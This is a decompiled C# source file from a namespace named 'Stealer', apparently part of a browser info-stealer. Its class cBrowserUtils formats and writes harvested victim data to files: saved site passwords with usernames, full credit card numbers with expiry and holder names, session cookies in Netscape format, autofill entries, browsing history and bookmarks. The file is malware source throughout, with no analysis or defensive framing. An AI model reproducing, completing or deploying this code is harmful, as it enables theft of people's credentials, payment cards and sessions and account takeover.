﻿using System;
using System.Collections.Generic;
using System.IO;

namespace Stealer
{
	// Token: 0x02000019 RID: 25
	internal sealed class cBrowserUtils
	{
		// Token: 0x0600006F RID: 111 RVA: 0x00004497 File Offset: 0x00002697
		private static string FormatPassword(Password pPassword)
		{
			return string.Format("Url: {0}\nUsername: {1}\nPassword: {2}\n\n", pPassword.sUrl, pPassword.sUsername, pPassword.sPassword);
		}

		// Token: 0x06000070 RID: 112 RVA: 0x000044B8 File Offset: 0x000026B8
		private static string FormatCreditCard(CreditCard cCard)
		{
			return string.Format("Type: {0}\nNumber: {1}\nExp: {2}\nHolder: {3}\n\n", new object[]
			{
				Banking.DetectCreditCardType(cCard.sNumber),
				cCard.sNumber,
				cCard.sExpMonth + "/" + cCard.sExpYear,
				cCard.sName
			});
		}

		// Token: 0x06000071 RID: 113 RVA: 0x00004514 File Offset: 0x00002714
		private static string FormatCookie(Cookie cCookie)
		{
			return string.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n", new object[]
			{
				cCookie.sHostKey,
				cCookie.sPath,
				cCookie.sExpiresUtc,
				cCookie.sName,
				cCookie.sValue
			});
		}

		// Token: 0x06000072 RID: 114 RVA: 0x00004563 File Offset: 0x00002763
		private static string FormatAutoFill(AutoFill aFill)
		{
			return string.Format("{0}\t\n{1}\t\n\n", aFill.sName, aFill.sValue);
		}

		// Token: 0x06000073 RID: 115 RVA: 0x0000457B File Offset: 0x0000277B
		private static string FormatHistory(Site sSite)
		{
			return string.Format("### {0} ### ({1}) {2}\n", sSite.sTitle, sSite.sUrl, sSite.iCount);
		}

		// Token: 0x06000074 RID: 116 RVA: 0x000045A1 File Offset: 0x000027A1
		private static string FormatBookmark(Bookmark bBookmark)
		{
			if (!string.IsNullOrEmpty(bBookmark.sUrl))
			{
				return string.Format("### {0} ### ({1})\n", bBookmark.sTitle, bBookmark.sUrl);
			}
			return string.Format("### {0} ###\n", bBookmark.sTitle);
		}

		// Token: 0x06000075 RID: 117 RVA: 0x000045DC File Offset: 0x000027DC
		public static bool WriteCookies(List<Cookie> cCookies, string sFile)
		{
			bool result;
			try
			{
				foreach (Cookie cCookie in cCookies)
				{
					File.AppendAllText(sFile, cBrowserUtils.FormatCookie(cCookie));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000076 RID: 118 RVA: 0x00004648 File Offset: 0x00002848
		public static bool WriteAutoFill(List<AutoFill> aFills, string sFile)
		{
			bool result;
			try
			{
				foreach (AutoFill aFill in aFills)
				{
					File.AppendAllText(sFile, cBrowserUtils.FormatAutoFill(aFill));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000077 RID: 119 RVA: 0x000046B4 File Offset: 0x000028B4
		public static bool WriteHistory(List<Site> sHistory, string sFile)
		{
			bool result;
			try
			{
				foreach (Site sSite in sHistory)
				{
					File.AppendAllText(sFile, cBrowserUtils.FormatHistory(sSite));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000078 RID: 120 RVA: 0x00004720 File Offset: 0x00002920
		public static bool WriteBookmarks(List<Bookmark> bBookmarks, string sFile)
		{
			bool result;
			try
			{
				foreach (Bookmark bBookmark in bBookmarks)
				{
					File.AppendAllText(sFile, cBrowserUtils.FormatBookmark(bBookmark));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000079 RID: 121 RVA: 0x0000478C File Offset: 0x0000298C
		public static bool WritePasswords(List<Password> pPasswords, string sFile)
		{
			bool result;
			try
			{
				foreach (Password pPassword in pPasswords)
				{
					if (!(pPassword.sUsername == "") && !(pPassword.sPassword == ""))
					{
						File.AppendAllText(sFile, cBrowserUtils.FormatPassword(pPassword));
					}
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600007A RID: 122 RVA: 0x0000481C File Offset: 0x00002A1C
		public static bool WriteCreditCards(List<CreditCard> cCC, string sFile)
		{
			bool result;
			try
			{
				foreach (CreditCard cCard in cCC)
				{
					File.AppendAllText(sFile, cBrowserUtils.FormatCreditCard(cCard));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}
	}
}
